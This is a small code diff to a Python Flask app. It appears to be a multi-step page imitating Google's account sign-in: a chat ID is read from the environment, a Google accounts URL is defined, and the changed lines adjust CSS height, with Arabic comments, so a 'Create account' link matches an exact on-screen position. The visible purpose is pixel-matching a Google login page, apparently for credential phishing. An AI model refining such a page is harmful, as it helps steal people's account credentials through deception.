@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: دفع "إنشاء حساب" للعلامة الحمراء بدقة مع الحفاظ على ثبات الشاشة
+# الصفحة الأولى: تعديل الارتفاع لتدنيس "إنشاء حساب" للعلامة المطلوبة بالضبط
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -111,7 +111,7 @@ def step1():
         .input-wrapper {
             width: 100%;
             text-align: right;
-            height: 130px; /* تحديد مساحة دقيقة لدفع رابط إنشاء حساب للعلامة الحمراء */
+            height: 160px; /* زيادة الارتفاع لضمان نزول رابط إنشاء حساب للمكان المطلوب تماماً */
             display: flex;
             flex-direction: column;
             justify-content: space-between;
